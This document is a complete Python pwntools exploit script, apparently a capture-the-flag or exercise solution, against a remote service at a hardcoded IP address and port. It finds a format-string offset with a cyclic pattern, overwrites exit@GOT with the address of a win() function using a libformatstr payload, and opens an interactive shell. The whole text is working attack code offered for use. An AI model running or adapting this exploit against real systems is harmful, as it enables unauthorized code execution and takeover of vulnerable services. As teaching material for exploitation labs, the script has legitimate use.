#!/usr/bin/env python
from libformatstr import *      # need this for libformatstr
from pwn import *
import sys

bufsiz = 100                    # size of cyclic pattern to send
buf = "" 
r = remote("203.34.119.82", 2345)

r.send(make_pattern(bufsiz) + "\n")             # send cyclic pattern to server
data = r.recv()                                 # server's response
offset, padding = guess_argnum(data, bufsiz)    # find format string offset and padding
log.info("offset : " + str(offset))
log.info("padding: " + str(padding))
r.close()
win_addr = 0x8048494   # gdb ex1 -batch -n -ex "p win"
exit_got = 0x296be3   # readelf -r ex1 | grep exit

p = FormatStr(bufsiz)
p[exit_got] = win_addr              # overwrite exit@got with address of win()
buf += p.payload(offset, padding)   # setup the payload

r = remote("203.34.119.82", 2345)
r.send(buf + "\n")                  # send payload to server

r.interactive()                     # get our shell